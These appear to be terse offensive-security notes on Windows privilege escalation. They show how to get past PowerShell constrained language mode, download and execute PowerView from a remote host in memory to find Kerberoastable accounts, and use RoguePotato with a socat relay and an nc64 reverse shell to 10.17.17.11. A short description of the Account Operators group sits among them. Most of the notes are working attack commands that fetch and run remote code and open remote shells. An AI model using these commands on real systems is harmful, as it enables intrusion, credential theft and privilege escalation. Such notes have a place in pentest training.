# SeMachineAccountPrivilege
```text-plain
$ExecutionContext.SessionState.LanguageMode
```

if this shows constrained, We can bypass this by using PowerShell version 2 and we can use PowerView to find an account with an SPN that we will use to Kerberoast:

```text-plain
powershell -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://10.17.17.11/PowerView.ps1'); get
-domainuser -spn"
```

* * *

The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.  
Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.

Rogue Potato:
-------------

```text-plain
socat tcp-l:135,reuseaddr,fork tcp:10.10.7.179:9999
c:\tools\roguepotato\RoguePotato.exe -r 10.17.17.11 -e "C:\tools\nc64 -e cmd.exe 10.17.17.11 4444" -l 9999
```